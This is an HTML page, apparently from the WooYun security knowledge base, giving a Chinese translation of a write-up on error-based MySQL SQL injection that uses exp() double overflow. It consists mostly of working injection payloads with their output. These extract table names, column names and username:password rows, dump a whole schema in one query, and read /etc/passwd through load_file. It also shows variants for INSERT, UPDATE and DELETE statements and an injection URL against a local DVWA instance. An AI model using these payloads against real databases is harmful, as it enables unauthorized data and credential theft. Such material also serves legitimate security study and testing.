@@ -1,0 +1,102 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">使用exp进行SQL报错注入</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">路人甲</a> <span class="bull">·</span> <time title="2015/08/25 17:44" ui-time="" datetime="2015/08/25 17:44" class="published ng-binding ng-isolate-scope">2015/08/25 17:44</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><p>此文为<code>BIGINT Overflow Error Based SQL Injection</code>的具体发现与实践</p><p>from:<a href="https://osandamalith.wordpress.com/2015/07/15/error-based-sql-injection-using-exp/">https://osandamalith.wordpress.com/2015/07/15/error-based-sql-injection-using-exp/</a></p><h1>0x01 前言概述</h1><hr><p>好消息好消息～作者又在<code>MySQL</code>中发现了一个<code>Double</code>型数据溢出。如果你想了解利用溢出来注出数据，你可以读一下作者之前发的博文：<a href="https://osandamalith.wordpress.com/2015/07/08/bigint-overflow-error-based-sql-injection/">BIGINT Overflow Error based injections</a>，drops上面也有对应翻译，具体见<a href="http://drops.wooyun.org/web/8024">这里</a>。当我们拿到<code>MySQL</code>里的函数时，作者比较感兴趣的是其中的数学函数，它们也应该包含一些数据类型来保存数值。所以作者就跑去测试看哪些函数会出现溢出错误。然后作者发现，当传递一个大于709的值时，<code>函数exp()</code>就会引起一个溢出错误。</p><pre><code>mysql&gt; select exp(709);
++-----------------------+
+| exp(709)              |
++-----------------------+
+| 8.218407461554972e307 |
++-----------------------+
+1 row in set (0.00 sec) 
+
+mysql&gt; select exp(710);
+ERROR 1690 (22003): DOUBLE value is out of range in 'exp(710)'
+</code></pre><p>在<code>MySQL</code>中，<code>exp</code>与<code>ln</code>和<code>log</code>的功能相反，简单介绍下，就是<code>log</code>和<code>ln</code>都返回以e为底数的对数，见等式：</p><p><img alt="enter image description here" img-src="2a08cd9fde16c6d1af769b67e1fb57ea3adff50d.jpg"></p><p><img alt="enter image description here" img-src="9e3783aa333596cd9a79cfa1d8a94dfb1f9f9e4d.jpg"></p><pre><code>mysql&gt; select log(15);
++------------------+
+| log(15)          |
++------------------+
+| 2.70805020110221 |
++------------------+
+1 row in set (0.00 sec) 
+
+
+mysql&gt; select ln(15);
++------------------+
+| ln(15)           |
++------------------+
+| 2.70805020110221 |
++------------------+
+1 row in set (0.00 sec)
+</code></pre><p>指数函数为对数函数的反函数，<code>exp()</code>即为以e为底的对数函数，如等式：</p><p><img alt="enter image description here" img-src="7e475298cd1e4f1eb83220c0256f10f68d08e146.jpg"></p><pre><code>mysql&gt; select exp(2.70805020110221);
++-----------------------+
+| exp(2.70805020110221) |
++-----------------------+
+|                    15 |
++-----------------------+
+1 row in set (0.00 sec)
+</code></pre><h1>0x02 注入</h1><hr><p>当涉及到注入时，我们使用否定查询来造成“<code>DOUBLE value is out of range</code>”的错误。作者之前的博文提到的，将0按位取反就会返回“<code>18446744073709551615</code>”，再加上函数成功执行后返回0的缘故，我们将成功执行的函数取反就会得到最大的无符号<code>BIGINT</code>值。</p><pre><code>mysql&gt; select ~0;
++----------------------+
+| ~0                   |
++----------------------+
+| 18446744073709551615 |
++----------------------+
+1 row in set (0.00 sec) 
+
+
+mysql&gt; select ~(select version());
++----------------------+
+| ~(select version())  |
++----------------------+
+| 18446744073709551610 |
++----------------------+
+1 row in set, 1 warning (0.00 sec)
+</code></pre><p>我们通过子查询与按位求反，造成一个<code>DOUBLE overflow error</code>，并借由此注出数据。</p><pre><code>&gt;`exp(~(select*from(select user())x))`
+
+    mysql&gt; select exp(~(select*from(select user())x));
+    ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="edca9f828299ad81828e8c8185829e99">[email&#160;protected]</a>' from dual)))'
+</code></pre><h1>0x03 注出数据</h1><hr><p>得到表名：</p><pre><code>select exp(~(select*from(select table_name from information_schema.tables where table_schema=database() limit 0,1)x));
+</code></pre><p>得到列名：</p><pre><code>select exp(~(select*from(select column_name from information_schema.columns where table_name='users' limit 0,1)x));
+</code></pre><p>检索数据：</p><pre><code>select exp(~ (select*from(select concat_ws(':',id, username, password) from users limit 0,1)x));
+</code></pre><h1>0x04 一蹴而就</h1><hr><p>这个查询可以从当前的上下文中dump出所有的tables与columns。我们也可以dump出所有的数据库，但由于我们是通过一个错误进行提取，它会返回很少的结果。</p><pre><code>exp(~(select*from(select(concat(@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x))
+
+http://localhost/dvwa/vulnerabilities/sqli/?id=1' or exp(~(select*from(select(concat(@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x))-- -&amp;Submit=Submit#
+</code></pre><p><img alt="enter image description here" img-src="e11eaf28f467a0cad1929c1ba1c144dbc0399819.jpg"></p><h1>0x04 读取文件</h1><hr><p>你可以通过<code>load_file()</code>函数来读取文件，但作者发现有13行的限制，该语句也可以在<code>BIGINT overflow injections</code>中使用。</p><pre><code>select exp(~(select*from(select load_file('/etc/passwd'))a));
+</code></pre><p><img alt="enter image description here" img-src="6f849e13bc54d61b247d54ec5c21c7224b57960d.jpg"></p><p>注意，你无法写文件，因为这个错入写入的只是0。</p><pre><code>mysql&gt; select exp(~(select*from(select 'hello')a)) into outfile 'C:/out.txt';
+ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'hello' from dual)))'    
+
+# type C:\out.txt
+0
+</code></pre><h1>0x05 Injection in Insert</h1><hr><p>按部就班就好</p><pre><code>mysql&gt; insert into users (id, username, password) values (2, '' ^ exp(~(select*from(select user())x)), 'Eyre');
+ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="cbecb9a4a4bf8ba7a4a8aaa7a3a4b8bf">[email&#160;protected]</a>' from dual)))'
+</code></pre><p>对于所有的<code>insert，update</code>和<code>delete</code>语句<code>DIOS</code>查询也同样可以使用。</p><pre><code>mysql&gt; insert into users (id, username, password) values (2, '' | exp(~(select*from(select(concat(@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x)), 'Eyre');
+ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select '000
+newdb::users::id
+newdb::users::username
+newdb::users::password' from dual)))'
+</code></pre><h1>0x06 Injection in Update</h1><hr><pre><code>mysql&gt; update users set password='Peter' ^ exp(~(select*from(select user())x)) where id=4;
+ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="ab8cd9c4c4dfebc7c4c8cac7c3c4d8df">[email&#160;protected]</a>' from dual)))'
+</code></pre><h1>0x07 Injection in Delete</h1><hr><pre><code>mysql&gt; delete from users where id='1' | exp(~(select*from(select user())x));
+ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="ae89dcc1c1daeec2c1cdcfc2c6c1ddda">[email&#160;protected]</a>' from dual)))'
+</code></pre><h1>0x08 总结</h1><hr><p>和前面的BIGINT注入一样，exp注入也适用于MySQL5.5.5及以上版本。以前的版本对于此情况则是“一言不发”。</p><pre><code>mysql&gt; select version();
++---------------------+
+| version()           |
++---------------------+
+| 5.0.45-community-nt |
++---------------------+
+1 row in set (0.00 sec) 
+
+
+mysql&gt; select exp(710);
++----------+
+| exp(710) |
++----------+
+|   1.#INF |
++----------+
+1 row in set (0.00 sec) 
+
+
+mysql&gt; select exp(~0);
++---------+
+| exp(~0) |
++---------+
+|  1.#INF |
++---------+
+1 row in set (0.00 sec)
+</code></pre><p>可能还有其他的函数会产生这种报错呦。（有待你发现啦：）</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">情痴</span> <span class="reply-time">2015-12-09 10:57:46</span></div><p></p><p>学习了，谢谢分享</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Sword</span> <span class="reply-time">2015-09-14 22:31:11</span></div><p></p><p>66666</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">qglfnt</span> <span class="reply-time">2015-08-29 01:30:04</span></div><p></p><p>学习了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小熊饼干</span> <span class="reply-time">2015-08-26 16:32:42</span></div><p></p><p>帅出新高度~</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">sm0nk</span> <span class="reply-time">2015-08-25 19:38:11</span></div><p></p><p>不错</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">yeweit6</span> <span class="reply-time">2015-08-25 17:59:36</span></div><p></p><p>不得不赞</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Azui</span> <span class="reply-time">2015-08-25 17:56:34</span></div><p></p><p>我觉得我一定是前排</p><p></p></div></div></div></div></div></main>
